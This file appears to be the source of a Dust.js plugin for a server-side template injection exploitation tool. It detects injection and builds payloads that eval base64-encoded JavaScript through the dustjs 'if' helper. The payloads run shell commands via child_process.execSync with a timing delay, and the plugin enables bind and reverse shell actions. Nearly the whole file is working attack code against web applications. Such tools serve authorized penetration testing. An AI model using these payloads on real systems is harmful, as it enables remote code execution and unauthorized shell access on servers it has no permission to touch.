from utils.strings import quote, chunkit, md5
from utils.loggers import log
from core import languages
from core.plugin import Plugin
from utils import rand
import base64
import re


class Dust(Plugin):

    actions = {
        'blind' : {
            'call': 'execute_blind',
            'bool_true' : 'true',
            'bool_false' : 'false'
        },
        'evaluate' : {
            'call': 'inject',
            'evaluate': """{@if cond=\"eval(Buffer('%(code_b64)s', 'base64').toString())\"}{/if}"""
        },
        # Not using execute here since it's rendered and requires set headers and trailers
        'execute_blind' : {
            'call': 'evaluate',
            # execSync() has been introduced in node 0.11, so this will not work with old node versions.
            # TODO: use another function.
            'execute_blind': """require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i');"""
        },
        'bind_shell' : {
            'call' : 'execute_blind',
            'bind_shell': languages.bash_bind_shell
        },
        'reverse_shell' : {
            'call': 'execute_blind',
            'reverse_shell' : languages.bash_reverse_shell
        }
    }

    contexts = [

        # Text context, no closures
        { 'level': 0 },
    ]

    language = 'javascript'

    """
    This replace _detect_render() since there is no real rendered evaluation in Dust.
    """
    def _detect_dust(self):

        # Print what it's going to be tested
        log.info('%s plugin is testing rendering' % (
                self.plugin,
                )
        )

        for prefix, suffix in self._generate_contexts():

            payload = '{!c!}'
            header_rand = rand.randint_n(10)
            header = str(header_rand)
            trailer_rand = rand.randint_n(10)
            trailer = str(trailer_rand)

            if '' == self.render(
                    code = payload,
                    header = header,
                    trailer = trailer,
                    header_rand = header_rand,
                    trailer_rand = trailer_rand,
                    prefix = prefix,
                    suffix = suffix
                ):
                self.set('header', '%s')
                self.set('trailer', '%s')
                self.set('prefix', prefix)
                self.set('suffix', suffix)
                self.set('engine', self.plugin.lower())
                self.set('language', self.language)
                
                return

    """
    Override detection phase to avoid reder check
    """
    def detect(self):

        self._detect_dust()

        if self.get('engine'):
    
            log.info('%s plugin has confirmed injection' % (
                self.plugin)
            )
            
            # Clean up any previous unreliable render data
            self.delete('unreliable_render')
            self.delete('unreliable')
            
            # Further exploitation requires if helper, which has
            # been deprecated in version dustjs-helpers@1.5.0 .
            # Check if helper presence here.

            rand_A = rand.randstr_n(2)
            rand_B = rand.randstr_n(2)
            rand_C = rand.randstr_n(2)
            
            expected = rand_A + rand_B + rand_C

            if expected in self.inject('%s{@if cond="1"}%s{/if}%s' % (rand_A, rand_B, rand_C)):
                
                log.info('%s plugin has confirmed the presence of dustjs if helper <= 1.5.0' % (
                    self.plugin)
                )            
        
                if self.execute_blind('echo %s' % str(rand.randint_n(2))):
                    self.set('blind', True)
                    self.set('execute_blind', True)
                    self.set('write', True)
                    self.set('bind_shell', True)
                    self.set('reverse_shell', True)

                    log.info('%s plugin has confirmed blind injection' % (self.plugin))


